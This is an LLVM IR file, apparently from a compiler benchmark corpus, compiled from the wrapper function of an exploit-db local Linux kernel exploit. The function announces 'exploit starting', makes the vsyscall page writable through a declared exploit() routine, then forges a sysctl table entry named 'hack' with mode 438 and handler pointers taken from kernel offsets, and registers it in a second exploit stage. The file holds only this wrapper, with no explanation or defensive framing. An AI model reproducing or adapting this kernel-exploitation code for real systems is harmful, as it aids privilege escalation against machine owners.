; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_40871.c_wrapper.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_40871.c_wrapper.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i64, i64, i32 }
%struct.ctl_table = type { i8*, i32, i32, i8*, i8*, i8*, i8* }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [18 x i8] c"exploit starting\0A\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c"making vsyscall page writable..\0A\0A\00", align 1
@off = common dso_local global %struct.TYPE_2__* null, align 8
@VSYSCALL = common dso_local global i64 0, align 8
@verify_stage1 = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [20 x i8] c"\0Astage 1 completed\0A\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c"registering new sysctl..\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"hack\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"\01\00\00\00\00", align 1
@verify_stage2 = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [19 x i8] c"stage 2 completed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @wrapper() #0 {
  %1 = alloca %struct.ctl_table*, align 8
  %2 = load i32, i32* @stderr, align 4
  %3 = call i32 @fprintf(i32 %2, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0))
  %4 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0))
  %5 = load %struct.TYPE_2__*, %struct.TYPE_2__** @off, align 8
  %6 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %5, i32 0, i32 3
  %7 = load i32, i32* %6, align 8
  %8 = load i64, i64* @VSYSCALL, align 8
  %9 = load i32, i32* @verify_stage1, align 4
  %10 = call i32 @exploit(i32 %7, i64 %8, i32 %9)
  %11 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0))
  %12 = call i32 @sleep(i32 5)
  %13 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %14 = load i64, i64* @VSYSCALL, align 8
  %15 = add nsw i64 %14, 2128
  %16 = inttoptr i64 %15 to %struct.ctl_table*
  store %struct.ctl_table* %16, %struct.ctl_table** %1, align 8
  %17 = load i64, i64* @VSYSCALL, align 8
  %18 = add nsw i64 %17, 2128
  %19 = inttoptr i64 %18 to i8*
  %20 = call i32 @memset(i8* %19, i8 signext 0, i32 1952)
  %21 = load i64, i64* @VSYSCALL, align 8
  %22 = add nsw i64 %21, 3840
  %23 = inttoptr i64 %22 to i8*
  %24 = call i32 @strcpy(i8* %23, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  %25 = load i64, i64* @VSYSCALL, align 8
  %26 = add nsw i64 %25, 3584
  %27 = inttoptr i64 %26 to i8*
  %28 = call i32 @memcpy(i8* %27, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32 4)
  %29 = load i64, i64* @VSYSCALL, align 8
  %30 = add nsw i64 %29, 3840
  %31 = inttoptr i64 %30 to i8*
  %32 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %33 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %32, i32 0, i32 0
  store i8* %31, i8** %33, align 8
  %34 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %35 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %34, i32 0, i32 1
  store i32 438, i32* %35, align 8
  %36 = load %struct.TYPE_2__*, %struct.TYPE_2__** @off, align 8
  %37 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %36, i32 0, i32 2
  %38 = load i64, i64* %37, align 8
  %39 = inttoptr i64 %38 to i8*
  %40 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %41 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %40, i32 0, i32 6
  store i8* %39, i8** %41, align 8
  %42 = load %struct.TYPE_2__*, %struct.TYPE_2__** @off, align 8
  %43 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %42, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = inttoptr i64 %44 to i8*
  %46 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %47 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %46, i32 0, i32 5
  store i8* %45, i8** %47, align 8
  %48 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %49 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %48, i32 0, i32 2
  store i32 256, i32* %49, align 4
  %50 = load i64, i64* @VSYSCALL, align 8
  %51 = add nsw i64 %50, 3584
  %52 = inttoptr i64 %51 to i8*
  %53 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %54 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %53, i32 0, i32 4
  store i8* %52, i8** %54, align 8
  %55 = load i64, i64* @VSYSCALL, align 8
  %56 = add nsw i64 %55, 3328
  %57 = inttoptr i64 %56 to i8*
  %58 = load %struct.ctl_table*, %struct.ctl_table** %1, align 8
  %59 = getelementptr inbounds %struct.ctl_table, %struct.ctl_table* %58, i32 0, i32 3
  store i8* %57, i8** %59, align 8
  %60 = load %struct.TYPE_2__*, %struct.TYPE_2__** @off, align 8
  %61 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 8
  %63 = load i64, i64* @VSYSCALL, align 8
  %64 = add nsw i64 %63, 2128
  %65 = load i32, i32* @verify_stage2, align 4
  %66 = call i32 @exploit(i32 %62, i64 %64, i32 %65)
  %67 = call i32 @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0))
  ret void
}

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @exploit(i32, i64, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
